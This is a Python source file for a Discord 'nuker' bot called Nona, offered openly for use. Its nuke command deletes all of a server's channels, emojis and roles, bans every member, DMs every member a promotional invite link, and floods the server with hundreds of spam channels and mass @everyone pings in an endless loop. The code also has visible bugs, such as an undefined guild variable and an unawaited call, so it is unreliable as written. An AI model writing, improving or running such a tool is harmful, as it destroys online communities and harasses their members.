#Imports:

import discord
import random
import os
import datetime
import json
import yaml

from discord.ext import commands
from colorama import Fore

#Define intents:

intents = discord.Intents().all()

#Define client:

Nona = commands.Bot(command_prefix="!n" , intents = intents)

#Fetch token:

with open("C:\Users\Tomas\Desktop\Nona\config.yml") as f:

    Token = yaml.load(f , Loader=yaml.FullLoader)

#Find command:

@Nona.event
async def on_ready():

    os.system("cls") #Clear current terminal.

    print(Fore.RED + """
 ███▄    █  ▒█████   ███▄    █  ▄▄▄         
 ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒████▄       
▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒██  ▀█▄     
▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒░██▄▄▄▄██    
▒██░   ▓██░░ ████▓▒░▒██░   ▓██░ ▓█   ▓██▒   
░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░   
░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ▒   ▒▒ ░   
   ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░   ░   ▒      
         ░     ░ ░           ░       ░  ░   
                                            
[*] Created by Coded#8264

[**] Github repository - https://github.com/Codedddd/Nona

[***] Don't be fucking dumb and enjoy ;)\n\n""")

    while not Nona.is_closed():

        global Guild_ID_Preset

        Guild_ID = input("Please input a guild ID: \n\n")

        Command = input("Please enter your command: ")

        if "nuke" in Command:

            command = Nona.get_command("nuke")

            await command()

@Nona.command()
async def nuke():

    Guild = Nona.get_guild(Guild_ID_Preset)
    
    #Delete all channels:

    for channel in Guild.channels:

        try:

            await channel.delete(reason = "Nona always wins!")

            print(f"{channel} has been deleted | {datetime.datetime}!")

        except Exception as exception: print(exception)

    #Delete all emojis:

    for emoji in Guild.emojis:

        try:

            await emoji.delete(reason = "Nona always wins!")

            print(f"{emoji} has been deleted | {datetime.datetime}!")

        except Exception as exception: print(exception) 

    #Delete all roles:

    for role in Guild.roles:

        try:

            await role.delete(reason = "Nona always wins!")

            print(f"{role} has been deleted | {datetime.datetime}!")

        except Exception as exception: print(exception)

    #DM all members:

    for member in Guild.Members:

        try:

            MsgDirectory = member.create_dm()

            await MsgDirectory.send("Nona now reigns! | https://dsc.gg/ariez")

        except Exception as exception: print(exception)

    #Ban all members:

    for member in Guild.members:

        try:

            await member.ban(reason = "Nona always wins!")

            print(f"{member} has been banned | {datetime.datetime}!")

        except Exception as exception: print(exception)

    #Create spam channels:

    f = open("Channels.jsonc")

    Channel_Names = json.load(f)

    try:

        for c in range(500):

            for Channel in Channel_Names["Channel-Names"]:

                New_Channel = await Guild.create_text_channel(Channel)

                await New_Channel.send("@everyone" * 200)

                print(f"Create new channel: {New_Channel} | {datetime.datetime}")

        f.close()

    except Exception as exception: print(exception)

    #Spam:

    f = open("Channels.jsonc")

    Channel_Names = json.load(f)

    try:

        while True:

            await random.choices(Channel_Names["Channel-Names"]).send("@everyone" * 200)

    except Exception as exception: print(exception)

Nona.run(Token)